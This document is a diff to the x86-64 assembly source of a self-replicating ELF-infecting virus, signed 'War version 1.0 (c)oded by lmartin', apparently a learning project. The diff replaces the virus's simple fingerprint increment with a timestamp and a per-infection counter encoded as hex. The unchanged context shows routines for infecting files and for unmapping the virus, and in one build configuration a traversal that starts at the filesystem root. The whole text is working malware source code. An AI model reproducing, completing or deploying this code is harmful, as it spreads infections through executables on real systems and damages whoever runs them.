@@ -35,7 +35,7 @@ _start:
 
 len_signature dq 0x34; stop at `lmartin`
 signature db `War version 1.0 (c)oded by lmartin - `; sw4g signature
-fingerprint db `00000000`, 0x0
+fingerprint db `00000000:0000`, 0x0
 
 _h3ll0w0rld:
 	pop r8; pop addr from stack
@@ -424,6 +424,44 @@ ret
 
 	cmp rax, 0x0
 	jne .return
+	push r15
+	xor r15, r15
+	; => Change fingerprint gettimeofday (r8 + fingerprint - _start)
+		sub rsp, 16; sizeof struct timeval
+		lea rdi, [rsp - 16]
+		xor rsi, rsi
+		push SYSCALL_GETTIMEOFDAY; gettimeofday
+		pop rax
+		syscall
+
+		lea rsi, [rel fingerprint]
+		lea rdi, [rel _start]
+		sub rsi, rdi
+		mov rdi, r8
+		add rdi, rsi
+		mov rsi, [rsp - 16]
+		lea rax, [rel hex_nums]
+
+		push 8
+		pop rcx
+		.remove_leading_zero:
+			rol rsi, 4
+			dec rcx
+			jnz .remove_leading_zero
+		push 8
+		pop rcx
+		.digit_loop:
+			rol rsi, 4
+			mov rdx, rsi
+			and rdx, 0x0f
+			movzx rdx, byte[rax + rdx]
+			mov byte[rdi], dl
+			inc rdi
+			dec rcx
+			jnz .digit_loop
+
+		add rsp, 16
+	;
 	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
@@ -436,6 +474,7 @@ ret
 	inc rcx
 	cmp byte[rdi + rcx], 0x0
 	jnz .loop_array_string
+	pop r15
 	.return:
 ret
 
@@ -764,12 +803,43 @@ _infect_file: ; (string rdi, stat rsi)
 
 			push rcx
 			; => Change fingerprint (r8 + fingerprint - _start)
-				lea rsi, [rel fingerprint]
-				lea rcx, [rel _start]
-				sub rsi, rcx
-				mov rcx, r8
-				add rcx, rsi
-				inc byte[rcx]
+				push rdi
+				push rdx
+				inc r15
+				lea rsi, [rel fingerprint + 9]
+				lea rdi, [rel _start]
+				sub rsi, rdi
+				mov rdi, r8
+				add rdi, rsi
+				mov rsi, r15
+				lea rax, [rel hex_nums]
+
+				push 12
+				pop rcx
+				.remove_leading_zero:
+					rol rsi, 4
+					dec rcx
+					jnz .remove_leading_zero
+				push 4
+				pop rcx
+				.digit_loop:
+					rol rsi, 4
+					mov rdx, rsi
+					and rdx, 0x0f
+					movzx rdx, byte[rax + rdx]
+					mov byte[rdi], dl
+					inc rdi
+					dec rcx
+					jnz .digit_loop
+				pop rdx
+				pop rdi
+
+;				lea rsi, [rel fingerprint]
+;				lea rcx, [rel _start]
+;				sub rsi, rcx
+;				mov rcx, r8
+;				add rcx, rsi
+;				inc byte[rcx]
 			;
 			push 8 * 3
 			pop rcx
@@ -1079,6 +1149,7 @@ ret
 
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
+hex_nums db `0123456789abcdef`, 0x0
 %ifdef FSOCIETY
 	directories db `/`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, 0x0
@@ -1142,8 +1213,6 @@ ret
 _munmap_virus:
 	push r8
 	pop rdi ; pop addr
-;	push r14
-;	pop rsi ; pop length
 	lea rsi, [rel _eof]
 	lea r8, [rel _params]
 	sub rsi, r8
